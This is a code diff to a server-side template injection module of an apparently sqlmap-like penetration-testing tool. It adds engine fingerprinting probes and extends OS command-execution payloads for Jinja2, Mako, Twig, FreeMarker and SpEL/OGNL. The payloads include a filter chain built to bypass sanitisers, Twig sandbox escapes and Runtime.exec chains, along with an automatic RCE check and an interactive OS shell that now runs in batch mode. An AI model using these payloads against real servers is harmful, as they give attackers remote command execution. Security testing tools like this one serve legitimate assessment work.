@@ -53,7 +53,23 @@ Engine = namedtuple("Engine", (
 
 
 def _arithmeticPayload(fmt, a, b):
-    return fmt % (a, b)
+    # Substitute the two operands into the first two %d tokens by literal replacement rather than
+    # %-formatting: some engines' delimiters contain a literal '%' (e.g. ERB '<%= ... %>'), where
+    # fmt % (a, b) raises ValueError and would silently disable arithmetic detection for them.
+    return fmt.replace("%d", str(a), 1).replace("%d", str(b), 1)
+
+
+def _expressionPayload(fmt, value):
+    # Same rationale as _arithmeticPayload(): literal %s substitution so '%'-delimited engines
+    # (notably ERB) can wrap expressions instead of crashing on fmt % value.
+    return fmt.replace("%s", value, 1)
+
+
+def _degroup(text):
+    # Strip digit-group (thousands) separators so an arithmetic result still matches when the
+    # engine formats large numbers with grouping (e.g. FreeMarker renders 234*567 as "132,678").
+    # Only separators sitting between digits are removed, so ordinary text is untouched.
+    return re.sub(u"(?<=\\d)[,\u00a0\u202f\u2009']" + u"(?=\\d)", "", getUnicode(text))
 
 
 _ENGINE_TABLE = (
@@ -66,10 +82,24 @@ _ENGINE_TABLE = (
            "{{ True }}", "{{ False }}", "True", "False",
            None, None,  # Jinja2/Twig distinguished by trueRendered ("True"/"False" vs "1"/"")
            "{{ %s }}",
-           # Jinja2: try multiple RCE paths in order (cycler -> config -> lipsum)
+           # Jinja2: try multiple RCE paths in order (cycler -> config -> lipsum -> attr()-chain).
+           # The last one is dot-/underscore-free (filters + \x5f-escaped dunders), bypassing
+           # sanitisers that block '.'/'_' (the CVE-2025-23211 Tandoor technique).
            (("{{ cycler.__init__.__globals__.os.popen('{CMD}').read() }}", "cycler.__globals__"),
             ("{{ config.from_envvar.__globals__.__builtins__.__import__('os').popen('{CMD}').read() }}", "config.from_envvar chain"),
-            ("{{ lipsum.__globals__.os.popen('{CMD}').read() }}", "lipsum.__globals__"))),
+            ("{{ lipsum.__globals__.os.popen('{CMD}').read() }}", "lipsum.__globals__"),
+            ("{{ cycler|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('{CMD}')|attr('read')() }}", "attr() filter chain (dot/underscore-free)"))),
+    Engine("Mako", "python",
+           "${", "}",
+           r"(?i)(?:mako\.exceptions\.\w+|mako\.runtime|CompileException|SyntaxException)",
+           ("${", "${}", "<%", "<%!"),
+           "${%d*%d}", "",
+           "${True}", "${False}", "True", "False",
+           None, None,  # capital True/False uniquely identifies Mako within the ${ } family (Freemarker/Spring render lowercase true/false)
+           "${%s}",
+           # Mako: popen captures output; self.module.runtime path needs no <%import%> preamble
+           (("${self.module.runtime.util.os.popen('{CMD}').read()}", "self.module.runtime.util.os.popen"),
+            ("<%import os%>${os.popen('{CMD}').read()}", "import os + popen"))),
     # -- PHP ----------------------------------------------------------------------------------------------
     Engine("Twig", "php",
            "{{", "}}",
@@ -77,20 +107,29 @@ _ENGINE_TABLE = (
            ("{{", "{{ }}", "{{ unknown|filter }}"),
            "{{ %d*%d }}", "{{ (%d*%d)|raw }}",
            "{{ true }}", "{{ false }}", "1", "",
-           "{{ _self }}", "Twig_Template",
+           # '_self' renders 'Twig_Template' (Twig 1) or '__string_template__...' (Twig 2/3);
+           # 'emplate' is the substring common to both, so the probe is version-stable
+           "{{ _self }}", "emplate",
            "{{ %s }}",
-           # Twig: try system -> exec -> shell_exec fallbacks
+           # Twig: filter() chain first; then sort()/map() callbacks, which double as classic
+           # sandbox escapes when 'filter' is not on the policy allow-list (DEEP1 Phishtale)
            (("{{ ['{CMD}']|filter('system') }}", "filter('system')"),
             ("{{ ['{CMD}']|filter('exec') }}", "filter('exec')"),
-            ("{{ ['{CMD}']|filter('shell_exec') }}", "filter('shell_exec')"))),
+            ("{{ ['{CMD}']|filter('shell_exec') }}", "filter('shell_exec')"),
+            ("{{ ['{CMD}', '']|sort('system')|join }}", "sort('system') sandbox escape"),
+            ("{{ ['{CMD}']|map('system')|join }}", "map('system') sandbox escape"))),
     # -- Java ---------------------------------------------------------------------------------------------
     Engine("Freemarker", "java",
            "${", "}",
            r"(?i)(?:freemarker\.(?:core|template|extract|cache)\.\w+|ParseException|InvalidReferenceException|TemplateException)",
            ("${", "${}", "<#if ", "<#--"),
            "${%d*%d}", "${(%d*%d)?no_esc}",
-           "${true}", "${false}", "true", "false",
-           "<#-- freemarker -->", "",
+           # modern FreeMarker errors on a bare ${true} ("boolean_format"); ?c gives the
+           # computer-format "true"/"false" string, so the boolean oracle works on real FreeMarker
+           "${true?c}", "${false?c}", "true", "false",
+           # Freemarker '?builtin' syntax (SpEL/Thymeleaf can't parse '?upper_case' -> errors there),
+           # giving an intrinsic, non-empty discriminator from Spring within the shared '${ }' family
+           '${"sstimark"?upper_case}', "SSTIMARK",
            "${%s}",
            # Freemarker: classic -> indirect-assign fallback
            (("${'freemarker.template.utility.Execute'?new()('{CMD}')}", "Execute?new"),
@@ -118,9 +157,15 @@ _ENGINE_TABLE = (
            ("${", "${}", "#{", "*{"),
            "${%d*%d}", "",
            "${true}", "${false}", "true", "false",
-           "${#request}", "",
+           # SpEL Java method call (Freemarker uses '?upper_case', not '.toUpperCase()' -> errors
+           # there), giving an intrinsic, non-empty discriminator from Freemarker in '${ }'
+           "${'sstimark'.toUpperCase()}", "SSTIMARK",
            "${%s}",
-           (("${T(java.lang.Runtime).getRuntime().exec('{CMD}')}", "T(Runtime).exec"),)),
+           # SpEL: read the process stdout (so output is captured, not just a Process object);
+           # then a blind exec; then the OGNL form for engines that parse OGNL instead of SpEL
+           (("${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('{CMD}').getInputStream())).readLine()}", "SpEL readLine (output)"),
+            ("${T(java.lang.Runtime).getRuntime().exec('{CMD}')}", "T(Runtime).exec (blind)"),
+            ("${(#rt=@java.lang.Runtime@getRuntime()).exec('{CMD}')}", "OGNL @Runtime@getRuntime (blind)"))),
     # -- Ruby ---------------------------------------------------------------------------------------------
     Engine("ERB", "ruby",
            "<%=", "%>",
@@ -302,8 +347,12 @@ def _probeArithmetic(place, parameter, engine):
         if p1 in text1 or p2 in text2:
             continue
 
+        # Match against a digit-group-stripped copy so a grouped result (e.g. FreeMarker's
+        # "132,678") still counts; the raw-reflection check above stays on the original text.
+        norm1, norm2 = _degroup(text1), _degroup(text2)
+
         # Each result must appear in its own response and NOT in the other
-        if result1 in text1 and result2 not in text1 and result2 in text2 and result1 not in text2:
+        if result1 in norm1 and result2 not in norm1 and result2 in norm2 and result1 not in norm2:
             return True
 
     return False
@@ -323,6 +372,43 @@ def _probeError(place, parameter, engine):
             continue
         if _isError(page, engine):
             return page
+    return None
+
+
+# A divide-by-zero error is language-family specific, which separates engines that SHARE a
+# delimiter but run on different runtimes (Jinja2/Python vs Twig/PHP in '{{ }}', or Mako/Python
+# vs Freemarker/Spring/Java in '${ }'). Matching is case-SENSITIVE so Python's lowercase
+# 'division by zero' is not confused with PHP's capitalised 'Division by zero'. JS is omitted on
+# purpose: 1/0 yields Infinity there rather than an error, so it carries no family signal.
+_FAMILY_DIVZERO = (
+    ("python", re.compile(r"division by zero")),
+    ("ruby",   re.compile(r"divided by 0")),
+    ("php",    re.compile(r"DivisionByZeroError|Division by zero")),
+    ("java",   re.compile(r"ArithmeticException|/ by zero")),
+)
+
+
+def _probeFamily(place, parameter, engine, cache):
+    """Inject a divide-by-zero inside the engine's delimiter and infer the backend language
+    family from the resulting error. Returns the family string or None. Responses are cached by
+    payload so engines that share a delimiter ('{{1/0}}' etc.) cost a single request."""
+
+    if not engine.arithmeticFmt or not engine.delimiterClose:
+        return None
+
+    payload = (_originalValue(place, parameter) or "") + engine.delimiter + "1/0" + engine.delimiterClose
+    if payload not in cache:
+        cache[payload] = _send(place, parameter, payload)
+    page = cache[payload]
+    if not page:
+        return None
+
+    text = getUnicode(page)
+    if payload in text:                      # raw reflection -> template did not execute it
+        return None
+    for family, regex in _FAMILY_DIVZERO:
+        if regex.search(text):
+            return family
     return None
 
 
@@ -391,17 +477,26 @@ def _booleanUniquelyIdentifies(engine):
     return count == 1
 
 
+def _familyUniquelyIdentifies(engine):
+    """Returns True when the engine's language family is unique among engines sharing the
+    same delimiter, so a divide-by-zero family probe is enough to name it exactly."""
+    siblings = [e for e in _ENGINE_TABLE if e.delimiter == engine.delimiter]
+    return sum(e.family == engine.family for e in siblings) == 1
+
+
 def _fingerprint(place, parameter):
     """Identify the template engine and confirm injection. Returns (engine, evidence)
     where evidence is a dict of detection results, or (None, None).
 
-    Scoring: arithmetic(3) + boolean(2) + error(1) + distinguishing(2).
-    Engines sharing delimiters require error, distinguishing, or unique boolean
-    rendering evidence to be named exactly; otherwise they are reported as family/probable."""
+    Scoring: arithmetic(3) + boolean(2) + error(1) + distinguishing(2) + family(1).
+    Engines sharing delimiters require error, distinguishing, unique boolean rendering, or a
+    uniquely-identifying language family to be named exactly; otherwise they are reported as
+    family/probable."""
 
     bestEngine = None
     bestEvidence = None
     bestScore = 0
+    divZeroCache = {}
 
     for engine in _ENGINE_TABLE:
         evidence = {}
@@ -429,6 +524,11 @@ def _fingerprint(place, parameter):
             evidence["distinguishing"] = True
             score += 2
 
+        # Phase 5: language-family confirmation via divide-by-zero error class
+        if _probeFamily(place, parameter, engine, divZeroCache) == engine.family:
+            evidence["family"] = True
+            score += 1
+
         if score > bestScore:
             bestScore = score
             bestEngine = engine
@@ -440,12 +540,13 @@ def _fingerprint(place, parameter):
         # or boolean rendering is unique within the delimiter family.
         _FAMILY = {
             "{{": "Jinja2/Twig/Handlebars-like",
-            "${": "Freemarker/SpringEL-like",
+            "${": "Freemarker/SpringEL/Mako-like",
         }
         if bestEngine.delimiter in _FAMILY:
             if (bestEvidence.get("error") or
                 bestEvidence.get("distinguishing") or
-                (bestEvidence.get("boolean") and _booleanUniquelyIdentifies(bestEngine))):
+                (bestEvidence.get("boolean") and _booleanUniquelyIdentifies(bestEngine)) or
+                (bestEvidence.get("family") and _familyUniquelyIdentifies(bestEngine))):
                 pass  # specific engine name stands
             else:
                 bestEngine = bestEngine._replace(
@@ -474,10 +575,10 @@ def sstiScan():
     global SENTINEL
     SENTINEL = randomStr(length=10, lowercase=True)
 
-    infoMsg = "'--ssti' is self-contained: it detects SSTI and fingerprints "
-    infoMsg += "common template engines when possible. SQL enumeration "
-    infoMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
-    logger.info(infoMsg)
+    debugMsg = "'--ssti' is self-contained: it detects SSTI and fingerprints "
+    debugMsg += "common template engines when possible. SQL enumeration "
+    debugMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
+    logger.debug(debugMsg)
 
     if not conf.paramDict:
         logger.error("no request parameters to test (use --data, GET params, or similar)")
@@ -502,7 +603,7 @@ def sstiScan():
                     beep()
 
                 if engine.arithmeticFmt:
-                    payload = _originalValue(place, parameter) + (engine.arithmeticFmt % (7, 7))
+                    payload = _originalValue(place, parameter) + _arithmeticPayload(engine.arithmeticFmt, 7, 7)
                 else:
                     payload = _originalValue(place, parameter) + engine.booleanTrue
                 title = "SSTI %s injection" % engine.name
@@ -530,18 +631,27 @@ def sstiScan():
     if found:
         slot = found[0]
         place, parameter, engine, evidence = slot
+        from lib.core.common import readInput
+
+        wantsTakeover = any(conf.get(_) for _ in ("osCmd", "osShell", "sstiQuery", "sstiShell"))
+
+        # If the user did not ask for exploitation, confirm (benignly) whether OS command
+        # execution is reachable and, if so, advise the relevant switches.
+        if not wantsTakeover and _canTakeover(engine, evidence) and _probeRce(place, parameter, engine):
+            logger.info("the back-end '%s' allows OS command execution via this injection; "
+                        "you are advised to try '--os-shell' (interactive) or "
+                        "'--os-cmd=<command>' (single command)" % engine.name)
 
         # --ssti-query: user-provided expression evaluated in-band
         if conf.get("sstiQuery"):
             _evalExpression(place, parameter, engine, conf.sstiQuery)
 
-        # --ssti-shell: interactive expression evaluation loop
+        # --ssti-shell: interactive expression evaluation loop (interactive even under --batch,
+        # like sqlmap's SQL --sql-shell/--os-shell, which read straight from the terminal)
         if conf.get("sstiShell"):
-            infoMsg = "calling SSTI shell. Enter expressions (e.g. 7*7) or 'exit'/'quit' to leave"
-            logger.info(infoMsg)
-            from lib.core.common import readInput
+            logger.info("calling SSTI shell. Enter expressions (e.g. 7*7) or 'exit'/'quit' to leave")
             while True:
-                expr = readInput("ssti-shell> ")
+                expr = readInput("ssti-shell> ", checkBatch=False)
                 if not expr or expr.strip().lower() in ("exit", "quit"):
                     break
                 _evalExpression(place, parameter, engine, expr.strip())
@@ -555,18 +665,15 @@ def sstiScan():
                 if conf.get("osCmd"):
                     _executeCommand(place, parameter, engine, conf.osCmd)
 
+                # Interactive shell runs even under --batch (mirrors the SQL --os-shell, which
+                # reads commands straight from the terminal); EOF / 'exit' / 'quit' leaves it.
                 if conf.get("osShell"):
-                    if conf.get("batch"):
-                        logger.info("skipping interactive OS shell in batch mode")
-                    else:
-                        infoMsg = "calling SSTI OS shell. Enter commands or 'exit'/'quit' to leave"
-                        logger.info(infoMsg)
-                        from lib.core.common import readInput
-                        while True:
-                            cmd = readInput("os-shell> ")
-                            if not cmd or cmd.strip().lower() in ("exit", "quit"):
-                                break
-                            _executeCommand(place, parameter, engine, cmd.strip())
+                    logger.info("calling SSTI OS shell. Enter commands or 'exit'/'quit' to leave")
+                    while True:
+                        cmd = readInput("os-shell> ", checkBatch=False)
+                        if not cmd or cmd.strip().lower() in ("exit", "quit"):
+                            break
+                        _executeCommand(place, parameter, engine, cmd.strip())
 
     logger.info("SSTI scan complete")
 
@@ -590,9 +697,9 @@ def _evalExpression(place, parameter, engine, expr):
 
     # Three-part payload: marker, expression, marker -- each in its own template tag
     # so the expression is evaluated independently of the markers
-    payload = original + (engine.expressionFmt % ("'%s'" % startMarker))
-    payload += " " + (engine.expressionFmt % expr)
-    payload += " " + (engine.expressionFmt % ("'%s'" % endMarker))
+    payload = original + _expressionPayload(engine.expressionFmt, "'%s'" % startMarker)
+    payload += " " + _expressionPayload(engine.expressionFmt, expr)
+    payload += " " + _expressionPayload(engine.expressionFmt, "'%s'" % endMarker)
     page = _send(place, parameter, payload)
 
     if not page:
@@ -636,6 +743,24 @@ def _canTakeover(engine, evidence):
     if not (evidence.get("arithmetic") or evidence.get("boolean")):
         return False
     return True
+
+
+def _probeRce(place, parameter, engine):
+    """Benign, quiet RCE-capability check: run `echo <marker>` via the engine's RCE payloads and
+    return True if the marker is reflected (proving OS command execution is reachable). Used only
+    to advise the user; it has no side effect beyond echoing a random token."""
+
+    if not engine.rcePayloads:
+        return False
+
+    marker = randomStr(length=12, lowercase=True)
+    original = _originalValue(place, parameter) or ""
+    for payloadTemplate, _description in engine.rcePayloads:
+        payload = payloadTemplate.replace("{CMD}", "echo %s" % marker)
+        page = _send(place, parameter, original + payload)
+        if page and marker in getUnicode(page):
+            return True
+    return False
 
 
 def _executeCommand(place, parameter, engine, cmd):
